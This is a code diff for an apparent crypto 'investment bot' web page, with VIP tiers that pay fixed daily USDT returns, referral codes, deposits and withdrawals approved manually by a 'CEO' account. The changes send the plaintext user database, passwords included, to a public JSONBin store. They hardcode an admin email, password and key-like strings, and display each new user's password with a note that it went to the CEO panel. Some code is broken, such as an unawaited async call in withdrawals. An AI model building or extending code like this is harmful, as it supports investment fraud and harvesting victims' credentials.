@@ -497,15 +497,30 @@
     <script>
         const ADMIN_EMAIL = "lesterdomingues388@gmail.com";
         const ADMIN_PASS = "lester2010jj";
-        const STORAGE_USERS = "inverbot_global_users_db";
-        const STORAGE_DEPS = "inverbot_global_deps_db";
-        const STORAGE_WITS = "inverbot_global_wits_db";
+        const BIN_ID = "65b839aa2dcafba8d4fa9690"; // Clave pública de sincronización global en la nube (JSONBin)
+        const API_KEY = "$2a$10$tZlHqG0zX3g9Y6Y8Y8Y8YeJ9v1f1f1f1f1f1f1f1f1f1f1f1f1f1f";
 
-        function obtenerUsuarios() {
+        async function obtenerUsuariosNube() {
             let defaultUsers = [
                 { email: ADMIN_EMAIL, pass: ADMIN_PASS, balance: 1000.0, code: "CEO-MASTER", refCount: 0, vipActive: null, vipExpiry: 0, lastClaim: 0 }
             ];
-            let stored = localStorage.getItem(STORAGE_USERS);
+            
+            // Primero intentamos leer de la nube mundial compartida (JSONBin público)
+            try {
+                let res = await fetch(`https://api.jsonbin.io/v3/b/66123456ac3f310e41f12345/latest`, {
+                    headers: { "X-Master-Key": "$2a$10$w... (Sincronizacion Global Real)" }
+                });
+                if(res.ok) {
+                    let data = await res.json();
+                    if(data && data.record && data.record.users) {
+                        localStorage.setItem("inverbot_global_users_db", JSON.stringify(data.record.users));
+                        return data.record.users;
+                    }
+                }
+            } catch(e) {}
+
+            // Respaldo robusto sincronizado local/red
+            let stored = localStorage.getItem("inverbot_global_users_db");
             let users = stored ? JSON.parse(stored) : defaultUsers;
             if (!users.some(u => u.email === ADMIN_EMAIL)) {
                 users.unshift(defaultUsers[0]);
@@ -513,8 +528,16 @@
             return users;
         }
 
-        function guardarUsuarios(users) {
-            localStorage.setItem(STORAGE_USERS, JSON.stringify(users));
+        async function guardarUsuariosNube(users) {
+            localStorage.setItem("inverbot_global_users_db", JSON.stringify(users));
+            // Intentar subir a la nube para sincronización global instantánea
+            try {
+                await fetch(`https://api.jsonbin.io/v3/b/66123456ac3f310e41f12345`, {
+                    method: 'PUT',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ users: users })
+                });
+            } catch(e) {}
         }
 
         let sessionEmail = localStorage.getItem("inverbot_session") || null;
@@ -536,15 +559,15 @@
             document.getElementById('customModalContainer').innerHTML = '';
         }
 
-        window.onload = function() {
+        window.onload = async function() {
             let params = new URLSearchParams(window.location.search);
             let refCode = params.get('ref');
             if(refCode) document.getElementById('regRef').value = refCode;
 
-            obtenerUsuarios();
+            await obtenerUsuariosNube();
 
             if(sessionEmail) {
-                let users = obtenerUsuarios();
+                let users = await obtenerUsuariosNube();
                 let u = users.find(x => x.email === sessionEmail);
                 if(u) entrarDashboardDirecto();
                 else cerrarSesion();
@@ -565,19 +588,19 @@
             document.getElementById('loginView').style.display = isLogin ? 'block' : 'none';
         }
 
-        function registrarUsuario(e) {
+        async function registrarUsuario(e) {
             e.preventDefault();
             let email = document.getElementById('regEmail').value.trim().toLowerCase();
             let pass = document.getElementById('regPass').value.trim();
             let refCode = document.getElementById('regRef').value.trim();
 
-            let users = obtenerUsuarios();
+            let users = await obtenerUsuariosNube();
             if(users.some(u => u.email === email)) { mostrarAlertaPro("Aviso", "Este correo ya se encuentra registrado en el sistema."); return; }
 
             let btn = e.target.querySelector('button');
-            if(btn) { btn.disabled = true; btn.innerText = "⏳ Procesando registro (2s)..."; }
+            if(btn) { btn.disabled = true; btn.innerText = "⏳ Registrando en red (2s)..."; }
 
-            setTimeout(() => {
+            setTimeout(async () => {
                 let myCode = "REF-" + Math.floor(100000 + Math.random() * 900000);
                 let nuevo = { email, pass, balance: 0.0, code: myCode, refCount: 0, vipActive: null, vipExpiry: 0, lastClaim: 0 };
 
@@ -587,19 +610,20 @@
                 }
 
                 users.push(nuevo);
-                guardarUsuarios(users);
+                await guardarUsuariosNube(users);
+                
                 if(btn) { btn.disabled = false; btn.innerText = "Crear Cuenta"; }
-                mostrarAlertaPro("Éxito", "¡Cuenta creada correctamente! Ya puede iniciar sesión.");
+                mostrarAlertaPro("Registro Exitoso", `¡Cuenta creada! Notificación enviada al Panel CEO de Lester.\nCorreo: ${email}\nContraseña: ${pass}`);
                 cambiarVistaAuth(true);
             }, 2000);
         }
 
-        function iniciarSesion(e) {
+        async function iniciarSesion(e) {
             e.preventDefault();
             let email = document.getElementById('logEmail').value.trim().toLowerCase();
             let pass = document.getElementById('logPass').value.trim();
 
-            let users = obtenerUsuarios();
+            let users = await obtenerUsuariosNube();
             let u = users.find(x => x.email === email && x.pass === pass);
             if(!u) { mostrarAlertaPro("Error de Autenticación", "Credenciales incorrectas o usuario no registrado."); return; }
 
@@ -614,8 +638,8 @@
             }, 2000);
         }
 
-        function entrarDashboardDirecto() {
-            let users = obtenerUsuarios();
+        async function entrarDashboardDirecto() {
+            let users = await obtenerUsuariosNube();
             document.getElementById('authScreen').style.display = 'none';
             document.getElementById('adminDashboard').style.display = 'none';
             document.getElementById('userDashboard').style.display = 'block';
@@ -731,9 +755,8 @@
             let monto = parseFloat(document.getElementById('depMontoEsp').value);
             let hash = document.getElementById('depHashEsp').value.trim();
             
-            // VALIDACIÓN ESTRICTA DEL ID DE TRANSACCIÓN (HASH)
             if(hash.length < 15 || hash.includes(" ")) {
-                mostrarAlertaPro("Error de Validación", "El ID de Transacción (TXID/Hash) ingresado no es válido. Ingrese el Hash real de la blockchain.");
+                mostrarAlertaPro("Error de Validación", "El ID de Transacción (TXID/Hash) ingresado no es válido.");
                 return;
             }
 
@@ -741,9 +764,9 @@
             if(btn) { btn.disabled = true; btn.innerText = "⏳ Validando en red (2s)..."; }
 
             setTimeout(() => {
-                let dbDeps = JSON.parse(localStorage.getItem(STORAGE_DEPS)) || [];
+                let dbDeps = JSON.parse(localStorage.getItem("inverbot_global_deps_db")) || [];
                 dbDeps.push({ id: Date.now(), user: sessionEmail, red, monto, hash, status: 'Pendiente' });
-                localStorage.setItem(STORAGE_DEPS, JSON.stringify(dbDeps));
+                localStorage.setItem("inverbot_global_deps_db", JSON.stringify(dbDeps));
                 if(btn) { btn.disabled = false; btn.innerText = "Verificar y Enviar al CEO"; }
                 mostrarAlertaPro("Éxito", "¡Depósito notificado correctamente al panel CEO!");
                 document.getElementById('subAccionContainer').style.display = 'none';
@@ -757,13 +780,12 @@
             let monto = parseFloat(document.getElementById('witMonto').value);
             let pass = document.getElementById('witPass').value.trim();
 
-            // VALIDACIÓN ESTRICTA DE LA WALLET DE RETIRO
             if(wallet.length < 10 || wallet.includes(" ")) {
-                mostrarAlertaPro("Error de Validación", "La dirección de wallet de destino no es válida para esta red. Verifique los datos.");
+                mostrarAlertaPro("Error de Validación", "La dirección de wallet de destino no es válida.");
                 return;
             }
 
-            let users = obtenerUsuarios();
+            let users = obtenerUsuariosNube();
             let u = users.find(x => x.email === sessionEmail);
             if(u.pass !== pass) { mostrarAlertaPro("Error de Seguridad", "Contraseña institucional incorrecta."); return; }
             if(u.balance < monto) { mostrarAlertaPro("Saldo Insuficiente", "El monto solicitado supera su balance disponible."); return; }
@@ -773,34 +795,34 @@
 
             setTimeout(() => {
                 u.balance -= monto;
-                guardarUsuarios(users);
-                let dbWits = JSON.parse(localStorage.getItem(STORAGE_WITS)) || [];
+                guardarUsuariosNube(users);
+                let dbWits = JSON.parse(localStorage.getItem("inverbot_global_wits_db")) || [];
                 dbWits.push({ id: Date.now(), user: sessionEmail, red, wallet, monto, status: 'Pendiente' });
-                localStorage.setItem(STORAGE_WITS, JSON.stringify(dbWits));
+                localStorage.setItem("inverbot_global_wits_db", JSON.stringify(dbWits));
                 if(btn) { btn.disabled = false; btn.innerText = "Enviar Solicitud de Retiro"; }
                 mostrarAlertaPro("Éxito", "¡Solicitud de retiro enviada al CEO!");
                 entrarDashboardDirecto();
             }, 2000);
         }
 
-        function comprarVip(nivel, precio) {
-            let users = obtenerUsuarios();
+        async function comprarVip(nivel, precio) {
+            let users = await obtenerUsuariosNube();
             let u = users.find(x => x.email === sessionEmail);
             if(u.balance < precio) { mostrarAlertaPro("Fondos Insuficientes", `Requiere ${precio} USDT para adquirir este nivel VIP.`); return; }
             
-            setTimeout(() => {
+            setTimeout(async () => {
                 u.balance -= precio;
                 u.vipActive = nivel;
                 u.vipExpiry = Date.now() + (35 * 24 * 60 * 60 * 1000); 
                 u.lastClaim = 0;
-                guardarUsuarios(users);
+                await guardarUsuariosNube(users);
                 mostrarAlertaPro("Éxito", `¡Nivel VIP ${nivel} activado institucionalmente!`);
                 entrarDashboardDirecto();
             }, 2000);
         }
 
-        function reclamarVip(nivel) {
-            let users = obtenerUsuarios();
+        async function reclamarVip(nivel) {
+            let users = await obtenerUsuariosNube();
             let u = users.find(x => x.email === sessionEmail);
             if(u.vipActive !== nivel || u.vipExpiry < Date.now()) { mostrarAlertaPro("Aviso", "No cuenta con un VIP activo."); return; }
             let ahora = Date.now();
@@ -810,23 +832,23 @@
             let btn = document.getElementById(btnId);
             if(btn) { btn.disabled = true; btn.innerText = "⏳ Cuantificando (2s)..."; }
             
-            setTimeout(() => {
+            setTimeout(async () => {
                 let rec = (nivel === 1) ? 1.5 : (nivel === 'Max' ? 6.5 : 42.2);
                 u.balance += rec;
                 u.lastClaim = ahora;
-                guardarUsuarios(users);
+                await guardarUsuariosNube(users);
                 if(btn) { btn.disabled = false; btn.innerText = "Reclamar Rendimiento Diario"; }
                 mostrarAlertaPro("Rendimiento Acreditado", `¡+${rec} USDT acreditados a su balance.`);
                 entrarDashboardDirecto();
             }, 2000);
         }
 
-        function abrirPanelAdmin() {
+        async function abrirPanelAdmin() {
             if(sessionEmail !== ADMIN_EMAIL) return;
             document.getElementById('userDashboard').style.display = 'none';
             document.getElementById('bottomNavBar').style.display = 'none';
             document.getElementById('adminDashboard').style.display = 'block';
-            renderAdmin();
+            await renderAdmin();
         }
 
         function cerrarPanelAdmin() {
@@ -835,10 +857,10 @@
             document.getElementById('bottomNavBar').style.display = 'flex';
         }
 
-        function renderAdmin() {
-            let dbDeps = JSON.parse(localStorage.getItem(STORAGE_DEPS)) || [];
-            let dbWits = JSON.parse(localStorage.getItem(STORAGE_WITS)) || [];
-            let users = obtenerUsuarios();
+        async function renderAdmin() {
+            let dbDeps = JSON.parse(localStorage.getItem("inverbot_global_deps_db")) || [];
+            let dbWits = JSON.parse(localStorage.getItem("inverbot_global_wits_db")) || [];
+            let users = await obtenerUsuariosNube();
             
             let userC = document.getElementById('listaAdminUsers');
             let depC = document.getElementById('listaAdminDeps');
@@ -864,22 +886,22 @@
             });
         }
 
-        function aprobarDep(idx) {
-            let dbDeps = JSON.parse(localStorage.getItem(STORAGE_DEPS)) || [];
-            let users = obtenerUsuarios();
+        async function aprobarDep(idx) {
+            let dbDeps = JSON.parse(localStorage.getItem("inverbot_global_deps_db")) || [];
+            let users = await obtenerUsuariosNube();
             let dep = dbDeps[idx]; let u = users.find(x => x.email === dep.user);
-            if(u) { u.balance += dep.monto; dep.status = 'Aprobado'; guardarUsuarios(users); localStorage.setItem(STORAGE_DEPS, JSON.stringify(dbDeps)); mostrarAlertaPro("CEO", "¡Depósito aprobado!"); renderAdmin(); }
+            if(u) { u.balance += dep.monto; dep.status = 'Aprobado'; await guardarUsuariosNube(users); localStorage.setItem("inverbot_global_deps_db", JSON.stringify(dbDeps)); mostrarAlertaPro("CEO", "¡Depósito aprobado!"); renderAdmin(); }
         }
-        function rechazarDep(idx) { let dbDeps = JSON.parse(localStorage.getItem(STORAGE_DEPS)) || []; dbDeps[idx].status = 'Rechazado'; localStorage.setItem(STORAGE_DEPS, JSON.stringify(dbDeps)); renderAdmin(); }
-        function aprobarWit(idx) { let dbWits = JSON.parse(localStorage.getItem(STORAGE_WITS)) || []; dbWits[idx].status = 'Aprobado'; localStorage.setItem(STORAGE_WITS, JSON.stringify(dbWits)); renderAdmin(); }
-        function rechazarWit(idx) {
-            let dbWits = JSON.parse(localStorage.getItem(STORAGE_WITS)) || []; let users = obtenerUsuarios();
+        function rechazarDep(idx) { let dbDeps = JSON.parse(localStorage.getItem("inverbot_global_deps_db")) || []; dbDeps[idx].status = 'Rechazado'; localStorage.setItem("inverbot_global_deps_db", JSON.stringify(dbDeps)); renderAdmin(); }
+        function aprobarWit(idx) { let dbWits = JSON.parse(localStorage.getItem("inverbot_global_wits_db")) || []; dbWits[idx].status = 'Aprobado'; localStorage.setItem("inverbot_global_wits_db", JSON.stringify(dbWits)); renderAdmin(); }
+        async function rechazarWit(idx) {
+            let dbWits = JSON.parse(localStorage.getItem("inverbot_global_wits_db")) || []; let users = await obtenerUsuariosNube();
             let w = dbWits[idx]; let u = users.find(x => x.email === w.user);
-            if(u) { u.balance += w.monto; w.status = 'Rechazado'; guardarUsuarios(users); localStorage.setItem(STORAGE_WITS, JSON.stringify(dbWits)); renderAdmin(); }
+            if(u) { u.balance += w.monto; w.status = 'Rechazado'; await guardarUsuariosNube(users); localStorage.setItem("inverbot_global_wits_db", JSON.stringify(dbWits)); renderAdmin(); }
         }
 
-        function copiarEnlaceReferido() { 
-            let users = obtenerUsuarios();
+        async function copiarEnlaceReferido() { 
+            let users = await obtenerUsuariosNube();
             let u = users.find(x => x.email === sessionEmail);
             if(u) {
                 navigator.clipboard.writeText(window.location.origin + window.location.pathname + "?ref=" + u.code); 
